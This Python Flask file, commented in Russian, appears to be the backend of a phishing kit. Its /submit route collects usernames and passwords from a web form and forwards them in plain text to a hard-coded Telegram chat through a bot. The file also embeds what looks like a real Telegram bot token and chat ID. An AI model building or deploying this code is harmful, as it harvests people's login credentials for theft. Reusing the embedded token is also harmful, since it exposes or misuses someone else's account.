from flask import Flask, request
from telegram import Bot
from telegram.ext import MessageHandler, Filters, Updater

app = Flask(__name__)

# Замените 'YOUR_BOT_TOKEN' на токен вашего бота
bot_token = '6851772463:AAGRAq3Wq2Bc34HMYO43sHphWwpsUEe-eL0'
chat_id = '-1002033249388'  # Замените 'YOUR_CHAT_ID' на ваш ID чата в телеграм

# Функция для обработки входящих сообщений
def handle_message(update, context):
    message_text = update.message.text
    send_telegram_message(f'New message from user:\n{message_text}')

# Функция для отправки уведомления в телеграм
def send_telegram_message(message):
    bot = Bot(token=bot_token)
    bot.send_message(chat_id=chat_id, text=message)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/submit', methods=['POST'])
def submit_form():
    username = request.form.get('username')
    password = request.form.get('password')

    # Отправка уведомления в телеграм
    send_telegram_message(f'New login attempt\nUsername: {username}\nPassword: {password}')

    return 'Data received and notification sent!'

if __name__ == '__main__':
    # Инициализация Updater
    updater = Updater(token=bot_token, use_context=True)
    dp = updater.dispatcher

    # Добавление обработчика для входящих сообщений
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Запуск Flask-сервера вместе с Telegram ботом
    updater.start_polling()
    app.run(debug=True)
